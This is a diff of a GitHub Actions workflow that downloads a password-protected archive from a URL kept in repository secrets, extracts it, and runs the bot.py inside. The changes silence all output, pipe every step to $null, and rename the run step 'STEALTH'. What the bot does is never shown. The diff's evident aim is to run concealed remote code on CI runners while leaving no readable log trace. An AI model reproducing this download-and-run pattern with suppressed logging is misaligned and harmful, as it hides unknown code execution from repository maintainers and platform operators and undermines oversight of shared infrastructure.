@@ -15,28 +15,27 @@ jobs:
     timeout-minutes: 90
 
     steps:
-      - name: Checkout
-        uses: actions/checkout@v3
+      - uses: actions/checkout@v3
 
-      - name: Install 7-Zip
-        run: choco install 7zip -y
+      - name: Install 7-Zip (silent)
+        run: choco install 7zip -y --no-progress > $null
 
-      - name: Download bot archive (SECRET LINK)
+      - name: Download bot archive (silent)
         shell: powershell
         env:
           BOT_LINK: ${{ secrets.LINK }}
         run: |
-          Invoke-WebRequest -Uri "$Env:BOT_LINK" -OutFile "bot.7z"
+          $ProgressPreference = 'SilentlyContinue'
+          Invoke-WebRequest -Uri "$Env:BOT_LINK" -OutFile "bot.7z" > $null
 
-      - name: Extract bot archive (SECRET PASSWORD)
+      - name: Extract bot archive (silent)
         shell: powershell
         env:
           BOT_PASSWORD: ${{ secrets.PASSWORD }}
         run: |
-          & "C:\Program Files\7-Zip\7z.exe" x bot.7z -p"$Env:BOT_PASSWORD" -oextracted -y
+          & "C:\Program Files\7-Zip\7z.exe" x bot.7z -p"$Env:BOT_PASSWORD" -oextracted -y > $null
 
-      - name: Run bot.py
+      - name: Run bot.py (STEALTH)
         shell: powershell
         run: |
-          Write-Host "[START] bot.py"
-          python extracted\bot.py
+          python extracted\bot.py *> $null
